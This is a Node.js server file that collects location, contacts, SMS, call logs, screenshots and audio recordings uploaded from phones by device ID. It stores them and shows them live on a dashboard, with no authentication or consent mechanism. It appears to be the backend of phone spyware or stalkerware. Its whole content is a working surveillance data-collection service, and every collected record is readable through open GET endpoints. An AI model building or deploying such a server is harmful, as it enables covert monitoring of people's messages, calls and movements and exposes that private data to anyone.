const express = require('express');
const http = require('http');
const cors = require('cors');
const { Server } = require('socket.io');
const path = require('path');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// In-memory data stores per device
const devices = {};
// Structure: devices[deviceId] = { info: {}, locations: [], contacts: [], sms: [], calllogs: [], screenshots: [], audio: [] }

function ensureDevice(deviceId) {
  if (!devices[deviceId]) {
    devices[deviceId] = {
      info: {},
      locations: [],
      contacts: [],
      sms: [],
      calllogs: [],
      screenshots: [],
      audio: []
    };
  }
}

function emitUpdate(deviceId, type, data) {
  io.emit(`new-${type}`, { deviceId, data });
}

// Multer setup for audio uploads
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const deviceId = req.body.deviceId || req.params.deviceId;
    const deviceUploadDir = path.join(uploadDir, deviceId);
    if (!fs.existsSync(deviceUploadDir)) {
      fs.mkdirSync(deviceUploadDir, { recursive: true });
    }
    cb(null, deviceUploadDir);
  },
  filename: function (req, file, cb) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    cb(null, `audio-${timestamp}.mp3`);
  }
});
const upload = multer({ storage: storage });

// POST: Location
app.post('/api/location', (req, res) => {
  const { deviceId, ...rest } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  const data = { ...rest, timestamp: new Date().toISOString() };
  devices[deviceId].locations.push(data);
  emitUpdate(deviceId, 'location', data);
  res.status(200).json({ message: 'Location received', data });
});

// POST: Contacts
app.post('/api/contacts', (req, res) => {
  const { deviceId, ...rest } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  const data = { ...rest, timestamp: new Date().toISOString() };
  devices[deviceId].contacts.push(data);
  emitUpdate(deviceId, 'contacts', data);
  res.status(200).json({ message: 'Contacts received', data });
});

// POST: SMS
app.post('/api/sms', (req, res) => {
  const { deviceId, ...rest } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  const data = { ...rest, timestamp: new Date().toISOString() };
  devices[deviceId].sms.push(data);
  emitUpdate(deviceId, 'sms', data);
  res.status(200).json({ message: 'SMS received', data });
});

// POST: Call Logs
app.post('/api/calllog', (req, res) => {
  const { deviceId, ...rest } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  const data = { ...rest, timestamp: new Date().toISOString() };
  devices[deviceId].calllogs.push(data);
  emitUpdate(deviceId, 'calllog', data);
  res.status(200).json({ message: 'Call log received', data });
});

// POST: Screenshot (base64 image string)
app.post('/api/screenshot', (req, res) => {
  const { deviceId, ...rest } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  const data = { ...rest, timestamp: new Date().toISOString() };
  devices[deviceId].screenshots.push(data);
  emitUpdate(deviceId, 'screenshot', data);
  res.status(200).json({ message: 'Screenshot received', data });
});

// POST: Multi-type data
app.post('/api/data', (req, res) => {
  const { deviceId, location, contacts: cts, sms: smsArr, calllog, screenshot, ...rest } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  let responses = [];
  if (location) {
    const data = { ...location, ...rest, timestamp: new Date().toISOString() };
    devices[deviceId].locations.push(data);
    emitUpdate(deviceId, 'location', data);
    responses.push({ type: 'location', data });
  }
  if (cts) {
    const data = { ...cts, ...rest, timestamp: new Date().toISOString() };
    devices[deviceId].contacts.push(data);
    emitUpdate(deviceId, 'contacts', data);
    responses.push({ type: 'contacts', data });
  }
  if (smsArr) {
    const data = { ...smsArr, ...rest, timestamp: new Date().toISOString() };
    devices[deviceId].sms.push(data);
    emitUpdate(deviceId, 'sms', data);
    responses.push({ type: 'sms', data });
  }
  if (calllog) {
    const data = { ...calllog, ...rest, timestamp: new Date().toISOString() };
    devices[deviceId].calllogs.push(data);
    emitUpdate(deviceId, 'calllog', data);
    responses.push({ type: 'calllog', data });
  }
  if (screenshot) {
    const data = { ...screenshot, ...rest, timestamp: new Date().toISOString() };
    devices[deviceId].screenshots.push(data);
    emitUpdate(deviceId, 'screenshot', data);
    responses.push({ type: 'screenshot', data });
  }
  if (!responses.length) {
    return res.status(400).json({ error: 'No valid data types provided' });
  }
  res.status(200).json({ message: 'Data received', responses });
});

// POST: Audio upload
app.post('/api/audio', upload.single('audio'), (req, res) => {
  const deviceId = req.body.deviceId;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  if (!req.file) return res.status(400).json({ error: 'No audio file uploaded' });
  const audioData = {
    filename: req.file.filename,
    url: `/uploads/${deviceId}/${req.file.filename}`,
    timestamp: new Date().toISOString()
  };
  devices[deviceId].audio.push(audioData);
  emitUpdate(deviceId, 'audio', audioData);
  res.status(200).json({ message: 'Audio uploaded', audio: audioData });
});

// POST: Device Info
app.post('/api/deviceinfo', (req, res) => {
  const { deviceId, ...info } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  devices[deviceId].info = { ...devices[deviceId].info, ...info, timestamp: new Date().toISOString() };
  io.emit('deviceinfo-update', { deviceId, info: devices[deviceId].info });
  res.status(200).json({ message: 'Device info updated', info: devices[deviceId].info });
});

// GET endpoints for each type (optionally filter by deviceId)
app.get('/api/devices', (req, res) => {
  res.json(Object.entries(devices).map(([id, d]) => ({ deviceId: id, info: d.info })));
});
app.get('/api/location', (req, res) => {
  const { deviceId } = req.query;
  if (deviceId) return res.json(devices[deviceId]?.locations || []);
  // All locations for all devices
  return res.json(Object.entries(devices).flatMap(([id, d]) => d.locations.map(l => ({ deviceId: id, ...l }))));
});
app.get('/api/contacts', (req, res) => {
  const { deviceId } = req.query;
  if (deviceId) return res.json(devices[deviceId]?.contacts || []);
  return res.json(Object.entries(devices).flatMap(([id, d]) => d.contacts.map(l => ({ deviceId: id, ...l }))));
});
app.get('/api/sms', (req, res) => {
  const { deviceId } = req.query;
  if (deviceId) return res.json(devices[deviceId]?.sms || []);
  return res.json(Object.entries(devices).flatMap(([id, d]) => d.sms.map(l => ({ deviceId: id, ...l }))));
});
app.get('/api/calllog', (req, res) => {
  const { deviceId } = req.query;
  if (deviceId) return res.json(devices[deviceId]?.calllogs || []);
  return res.json(Object.entries(devices).flatMap(([id, d]) => d.calllogs.map(l => ({ deviceId: id, ...l }))));
});
app.get('/api/screenshot', (req, res) => {
  const { deviceId } = req.query;
  if (deviceId) return res.json(devices[deviceId]?.screenshots || []);
  return res.json(Object.entries(devices).flatMap(([id, d]) => d.screenshots.map(l => ({ deviceId: id, ...l }))));
});
app.get('/api/audio', (req, res) => {
  const { deviceId } = req.query;
  if (deviceId) return res.json(devices[deviceId]?.audio || []);
  return res.json(Object.entries(devices).flatMap(([id, d]) => d.audio.map(l => ({ deviceId: id, ...l }))));
});

// WebSocket connection
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  socket.emit('init-data', devices);
});

server.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
}); 